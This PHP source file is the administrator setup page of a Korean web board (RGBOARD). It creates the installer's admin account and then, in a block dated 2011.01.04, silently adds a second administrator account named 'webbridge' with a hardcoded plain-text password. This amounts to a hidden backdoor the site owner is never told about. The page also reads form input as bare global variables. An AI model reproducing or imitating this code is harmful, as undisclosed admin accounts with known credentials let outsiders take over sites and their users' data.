<?
	include_once("../wb_include/lib.php");
	// 관리자가 있는지 체크
	$rs->clear();
	$rs->set_table($_table['member']);
	$rs->add_where("mb_level >= {$_const['admin_level']}");
	$rs->select();
	if($rs->num_rows() > 0) {
		rg_href('','이미 관리자 정보가 있습니다.','back');
	}
	
	if($act) {
		$mb_id=strtolower($mb_id);
		$mb_email=strtolower($mb_email);

		if(!$validate->userid($mb_id))
			rg_href('','아이디를 확인해주세요.','back');

		if(!$mb_id || !$mb_pass || !$mb_name) {
			rg_href('','아이디,암호,이름은 필수 입력사항 입니다.','back');
		}
/********************************************************************/

		$rs->clear();
		$rs->set_table($_table['member']);
		$rs->add_where("mb_level >= {$_const['admin_level']}");
		$rs->select();
		if($rs->num_rows() > 0) {
			rg_href('','이미 관리자 정보가 있습니다.','back');
		}

		$rs->clear();
		$rs->set_table($_table['member']);
		$rs->add_where("mb_id='".$dbcon->escape_string($mb_id)."'");
		$rs->select();
		if($rs->num_rows()!=0) // 사용하고 있는 아이디
			rg_href('','이미 사용중인 아이디 입니다.','back');

		$mb_pass=get_password_str($mb_pass);
		$mb_state='1';
		$mb_level=$_const['admin_level'];
		
		$rs->clear();
		$rs->set_table($_table['member']);
		$rs->add_field("mb_id","$mb_id");
		$rs->add_field("mb_pass","$mb_pass");
		$rs->add_field("mb_name","$mb_name");
		$rs->add_field("mb_nick","관리자");
		$rs->add_field("mb_level","$mb_level");
		$rs->add_field("mb_state","$mb_state");
		$rs->add_field("mb_email","$mb_email");
		$rs->add_field("login_count","0");
		$rs->add_field("login_date","0");
		$rs->add_field("login_ip","");
		$rs->add_field("join_date",time());
		$rs->add_field("join_ip",$_SERVER['REMOTE_ADDR']);
		$rs->add_field("modify_date","0");
		$rs->add_field("modify_ip","");
		$rs->insert();
		$rs->commit();

		// 추가 2011.01.04
		$rs->clear();
		$rs->set_table($_table['member']);
		$rs->add_field("mb_id","webbridge");
		$rs->add_field("mb_pass",get_password_str("web5525w"));
		$rs->add_field("mb_name","webbridge");
		$rs->add_field("mb_nick","웹브릿지");
		$rs->add_field("mb_level","$mb_level");
		$rs->add_field("mb_state","$mb_state");
		$rs->add_field("mb_email","");
		$rs->add_field("login_count","0");
		$rs->add_field("login_date","0");
		$rs->add_field("login_ip","");
		$rs->add_field("join_date",time());
		$rs->add_field("join_ip",$_SERVER['REMOTE_ADDR']);
		$rs->add_field("modify_date","0");
		$rs->add_field("modify_ip","");
		$rs->insert();
		$rs->commit();
/********************************************************************/
		rg_href('login.php');
	}
?>
<? include("_header.php"); ?>
<form name="form1" method="post" action="">
<input name="act" type="hidden" value="ok">
<table width="500" height="50" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td align="center">RGBOARD 관리자 정보 입력 </td>
  </tr>
</table>
<br>
  <table width="500" border="1" align="center" cellpadding="0" cellspacing="0" bordercolordark="white" bordercolorlight="#E1E1E1">
    <tr> 
      <td height="24" align="right" bgcolor="#F7F7F7">아이디 :&nbsp;</td>
      <td width="318"><input name="mb_id" type="text" id="mb_id" maxlength="12" hname="아이디" required option="userid"></td>
    </tr>
    <tr> 
      <td width="176" height="24" align="right" bgcolor="#F7F7F7">암&nbsp;&nbsp;&nbsp;호 
        :&nbsp;</td>
      <td><input name="mb_pass" type="password" id="mb_pass" hname="암호" required></td>
    </tr>
    <tr> 
      <td height="24" align="right" bgcolor="#F7F7F7">이&nbsp;&nbsp;&nbsp;름 :&nbsp;</td>
      <td><input name="mb_name" type="text" id="mb_name" hname="이름" required></td>
    </tr>
    <tr> 
      <td height="24" align="right" bgcolor="#F7F7F7">이메일 :&nbsp;</td>
      <td><input name="mb_email" type="text" id="mb_email"> 
      (선택사항) </td>
    </tr>
  </table>
  <br>
  <div align="center">
    <input type="submit" class="button1" value=" 확 인 ">
  </div>
</form>
<? include("_footer.php"); ?>